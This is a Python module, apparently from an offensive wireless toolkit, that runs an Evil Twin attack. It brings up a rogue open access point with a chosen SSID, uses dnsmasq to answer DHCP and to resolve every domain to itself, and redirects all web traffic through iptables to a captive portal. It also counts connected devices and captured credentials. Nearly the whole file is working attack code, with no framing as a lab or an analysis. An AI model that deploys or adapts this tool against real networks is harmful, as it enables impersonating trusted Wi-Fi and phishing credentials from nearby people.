"""Evil Twin orchestrator — rogue AP + DHCP/DNS hijack + captive portal.

Stands up:
  1. Static IP 192.168.45.1/24 on the chosen Wi-Fi interface.
  2. hostapd serving an open AP with the user's chosen SSID.
  3. dnsmasq doing DHCP for 192.168.45.10..100 and DNS-hijacking everything
     to 192.168.45.1.
  4. iptables NAT chain BIGBOX_CAPTIVE that redirects all TCP 80/443 from
     the AP iface to the captive portal.
  5. CaptivePortal HTTP server on 192.168.45.1:80.

Tear down reverses the order. The iptables rules live in their own chain
so cleanup never touches the user's existing firewall config.

This is destructive on the chosen interface — NetworkManager loses
control of it for the duration of the session. Use a dedicated USB
adapter (Alfa, etc.) to keep the box online during operation.
"""
from __future__ import annotations

import os
import shutil
import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

from bigbox.captive_portal import CaptivePortal


AP_IP = "192.168.45.1"
AP_NETMASK = "255.255.255.0"
AP_CIDR = f"{AP_IP}/24"
DHCP_RANGE_START = "192.168.45.10"
DHCP_RANGE_END = "192.168.45.100"
DHCP_LEASE_TIME = "2h"

HOSTAPD_CONF = Path("/tmp/bigbox-hostapd.conf")
DNSMASQ_CONF = Path("/tmp/bigbox-dnsmasq.conf")
DNSMASQ_LEASES = Path("/tmp/bigbox-dnsmasq.leases")
DNSMASQ_PIDFILE = Path("/tmp/bigbox-dnsmasq.pid")
HOSTAPD_LOG = Path("/tmp/bigbox-hostapd.log")
DNSMASQ_LOG = Path("/tmp/bigbox-dnsmasq.log")

IPT_CHAIN = "BIGBOX_CAPTIVE"


def _run(cmd: list[str], timeout: float = 5.0,
         input_data: bytes | None = None) -> tuple[int, str]:
    """Best-effort run; returns (rc, output). Never raises."""
    try:
        out = subprocess.run(
            cmd,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            stdin=subprocess.PIPE if input_data else subprocess.DEVNULL,
            input=input_data,
            timeout=timeout,
        )
        return out.returncode, (out.stdout or b"").decode("utf-8", "replace")
    except FileNotFoundError:
        return 127, f"{cmd[0]}: not installed"
    except subprocess.TimeoutExpired:
        return 124, f"{cmd[0]}: timed out"
    except Exception as e:
        return 1, f"{cmd[0]}: {type(e).__name__}: {e}"


def iface_supports_ap(iface: str) -> bool:
    """Check `iw list` for an AP-mode entry. Conservative: returns True if
    we couldn't tell (so the user gets to try)."""
    rc, out = _run(["iw", "list"], timeout=5)
    if rc != 0:
        return True  # be permissive if iw failed
    # Find Supported interface modes for this phy.
    in_modes = False
    for line in out.splitlines():
        s = line.strip()
        if s.startswith("Supported interface modes:"):
            in_modes = True
            continue
        if in_modes:
            if s.startswith("*"):
                if "AP" in s and "AP/VLAN" not in s:
                    return True
            else:
                in_modes = False
    return False


# ---------- config templating ----------

def _write_hostapd_conf(iface: str, ssid: str, channel: int = 6) -> None:
    body = (
        f"interface={iface}\n"
        "driver=nl80211\n"
        f"ssid={ssid}\n"
        "hw_mode=g\n"
        f"channel={channel}\n"
        "auth_algs=1\n"
        "wmm_enabled=0\n"
        "ignore_broadcast_ssid=0\n"
        "macaddr_acl=0\n"
    )
    HOSTAPD_CONF.write_text(body)


def _write_dnsmasq_conf(iface: str) -> None:
    body = (
        f"interface={iface}\n"
        "bind-interfaces\n"
        "no-resolv\n"
        "no-poll\n"
        # Hand out DHCP from the AP_IP range.
        f"dhcp-range={DHCP_RANGE_START},{DHCP_RANGE_END},{DHCP_LEASE_TIME}\n"
        f"dhcp-option=3,{AP_IP}\n"            # gateway
        f"dhcp-option=6,{AP_IP}\n"            # dns server
        f"dhcp-leasefile={DNSMASQ_LEASES}\n"
        f"pid-file={DNSMASQ_PIDFILE}\n"
        # DNS hijack: every name resolves to us.
        f"address=/#/{AP_IP}\n"
        # Cache-bust some captive-portal probe domains so iOS/Android
        # always see a fresh response.
        "no-hosts\n"
    )
    DNSMASQ_CONF.write_text(body)


# ---------- iface + iptables ----------

def _flush_iface_addrs(iface: str) -> None:
    _run(["ip", "addr", "flush", "dev", iface], timeout=5)


def _set_iface_addr(iface: str) -> None:
    _run(["ip", "link", "set", iface, "up"], timeout=5)
    _run(["ip", "addr", "add", AP_CIDR, "dev", iface], timeout=5)


def _install_iptables(iface: str) -> None:
    # Create an isolated chain so we can flush/delete only our rules later
    # without touching the user's other firewall config.
    _run(["iptables", "-t", "nat", "-N", IPT_CHAIN], timeout=5)
    _run(["iptables", "-t", "nat", "-F", IPT_CHAIN], timeout=5)

    # Redirect all TCP 80 / 443 from the AP iface into the chain, and from
    # there DNAT to our captive portal on AP_IP:80.
    _run(["iptables", "-t", "nat", "-A", "PREROUTING",
          "-i", iface, "-p", "tcp", "--dport", "80",
          "-j", IPT_CHAIN], timeout=5)
    _run(["iptables", "-t", "nat", "-A", "PREROUTING",
          "-i", iface, "-p", "tcp", "--dport", "443",
          "-j", IPT_CHAIN], timeout=5)
    _run(["iptables", "-t", "nat", "-A", IPT_CHAIN,
          "-p", "tcp",
          "-j", "DNAT", "--to-destination", f"{AP_IP}:80"], timeout=5)
    # Allow the inbound HTTP to actually reach the portal process.
    _run(["iptables", "-A", "INPUT", "-i", iface,
          "-p", "tcp", "--dport", "80",
          "-j", "ACCEPT"], timeout=5)


def _remove_iptables(iface: str) -> None:
    # Remove our PREROUTING jumps to BIGBOX_CAPTIVE (might be one or two).
    for _ in range(4):
        rc, _ = _run(["iptables", "-t", "nat", "-D", "PREROUTING",
                      "-i", iface, "-p", "tcp", "--dport", "80",
                      "-j", IPT_CHAIN], timeout=3)
        if rc != 0:
            break
    for _ in range(4):
        rc, _ = _run(["iptables", "-t", "nat", "-D", "PREROUTING",
                      "-i", iface, "-p", "tcp", "--dport", "443",
                      "-j", IPT_CHAIN], timeout=3)
        if rc != 0:
            break
    # Remove the INPUT allow rule.
    for _ in range(4):
        rc, _ = _run(["iptables", "-D", "INPUT", "-i", iface,
                      "-p", "tcp", "--dport", "80",
                      "-j", "ACCEPT"], timeout=3)
        if rc != 0:
            break
    # Flush + delete our private chain.
    _run(["iptables", "-t", "nat", "-F", IPT_CHAIN], timeout=3)
    _run(["iptables", "-t", "nat", "-X", IPT_CHAIN], timeout=3)


# ---------- session ----------

@dataclass
class EvilTwinSession:
    iface: str
    ssid: str
    channel: int = 6
    skip_portal: bool = False

    portal: Optional[CaptivePortal] = None
    hostapd_proc: Optional[subprocess.Popen] = None
    dnsmasq_proc: Optional[subprocess.Popen] = None
    started_at: float = 0.0
    last_status: str = ""
    error: str = ""

    # ---------- public ----------
    def start(self) -> tuple[bool, str]:
        if not shutil.which("hostapd"):
            self.error = "hostapd not installed"
            return False, self.error
        if not shutil.which("dnsmasq"):
            self.error = "dnsmasq not installed"
            return False, self.error

        # 0. Kill any existing dnsmasq/hostapd that might be lingering from a
        #    crashed session or another tool (DeadDrop, Honeypot).
        _run(["killall", "dnsmasq"], timeout=2)
        _run(["killall", "hostapd"], timeout=2)
        time.sleep(0.5)

        # 1. Take iface away from NetworkManager + clean its addrs
        if shutil.which("nmcli"):
            _run(["nmcli", "device", "set", self.iface, "managed", "no"],
                 timeout=5)
        _flush_iface_addrs(self.iface)
        _set_iface_addr(self.iface)

        # 2. Templates
        _write_hostapd_conf(self.iface, self.ssid, self.channel)
        _write_dnsmasq_conf(self.iface)

        # 3. iptables NAT for the captive portal
        _install_iptables(self.iface)

        # 4. dnsmasq (DHCP+DNS) — start before hostapd so leases are ready
        try:
            self.dnsmasq_proc = subprocess.Popen(
                ["dnsmasq", "--keep-in-foreground", "--conf-file=" + str(DNSMASQ_CONF)],
                stdout=DNSMASQ_LOG.open("w"),
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
            )
        except FileNotFoundError:
            self.error = "dnsmasq not found in PATH"
            self.stop()
            return False, self.error

        # Give dnsmasq a moment; if it died immediately, surface that.
        time.sleep(0.4)
        if self.dnsmasq_proc.poll() is not None:
            self.error = self._read_log_tail(DNSMASQ_LOG, "dnsmasq")
            self.stop()
            return False, self.error

        # 5. hostapd
        try:
            self.hostapd_proc = subprocess.Popen(
                ["hostapd", str(HOSTAPD_CONF)],
                stdout=HOSTAPD_LOG.open("w"),
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
            )
        except FileNotFoundError:
            self.error = "hostapd not found in PATH"
            self.stop()
            return False, self.error

        time.sleep(1.0)
        if self.hostapd_proc.poll() is not None:
            self.error = self._read_log_tail(HOSTAPD_LOG, "hostapd")
            self.stop()
            return False, self.error

        # 6. Captive portal
        if not self.skip_portal:
            self.portal = CaptivePortal(ssid=self.ssid)
            ok, msg = self.portal.start()
            if not ok:
                self.error = msg
                self.stop()
                return False, msg

        self.started_at = time.time()
        self.last_status = f"AP '{self.ssid}' up on {self.iface}"
        return True, self.last_status

    def stop(self) -> None:
        # Reverse order — portal -> hostapd -> dnsmasq -> iptables -> iface
        if self.portal:
            try:
                self.portal.stop()
            except Exception:
                pass
            self.portal = None

        for proc in (self.hostapd_proc, self.dnsmasq_proc):
            if proc and proc.poll() is None:
                try:
                    proc.terminate()
                    proc.wait(timeout=2)
                except Exception:
                    try:
                        proc.kill()
                    except Exception:
                        pass
        self.hostapd_proc = None
        self.dnsmasq_proc = None

        # iptables
        try:
            _remove_iptables(self.iface)
        except Exception:
            pass

        # iface back to managed
        try:
            _flush_iface_addrs(self.iface)
        except Exception:
            pass
        if shutil.which("nmcli"):
            _run(["nmcli", "device", "set", self.iface, "managed", "yes"],
                 timeout=5)
            _run(["nmcli", "networking", "on"], timeout=5)

    # ---------- introspection ----------
    def is_running(self) -> bool:
        if not self.hostapd_proc or self.hostapd_proc.poll() is not None:
            return False
        if not self.dnsmasq_proc or self.dnsmasq_proc.poll() is not None:
            return False
        return True

    def clients_connected(self) -> int:
        """Count of active DHCP leases — how many devices joined."""
        if not DNSMASQ_LEASES.exists():
            return 0
        try:
            return sum(1 for ln in DNSMASQ_LEASES.read_text().splitlines() if ln.strip())
        except Exception:
            return 0

    def creds_captured(self) -> int:
        return self.portal.creds_captured if self.portal else 0

    def uptime_s(self) -> int:
        return int(max(0, time.time() - self.started_at)) if self.started_at else 0

    @staticmethod
    def _read_log_tail(path: Path, label: str) -> str:
        try:
            txt = path.read_text(errors="replace")
            tail = [ln for ln in txt.splitlines() if ln.strip()][-3:]
            return f"{label} died: " + " | ".join(tail)
        except Exception:
            return f"{label} died (no log)"
